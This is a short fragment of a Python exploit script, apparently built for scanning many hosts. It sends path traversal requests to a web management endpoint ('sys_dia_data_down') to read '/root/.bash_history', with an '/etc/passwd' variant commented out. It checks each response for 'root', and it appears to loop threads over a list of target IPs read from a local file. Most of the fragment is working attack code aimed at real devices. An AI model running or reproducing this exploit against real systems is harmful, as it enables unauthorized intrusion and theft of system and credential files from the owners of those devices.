...
def exploit(ip_, index):
    try:
        ...
        # url = ip_+'/webui/?g=sys_dia_data_down&file_name=../etc/passwd'
        url = ip_+'/webui/?g=sys_dia_data_down&file_name=../root/.bash_history'
        # print(index,url)
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        if res.status_code!=200 or 'root' not in res.text:
            return
...
threads = []
# with open(r'D:\Downloads\tmp\SG.txt', 'r') as file:
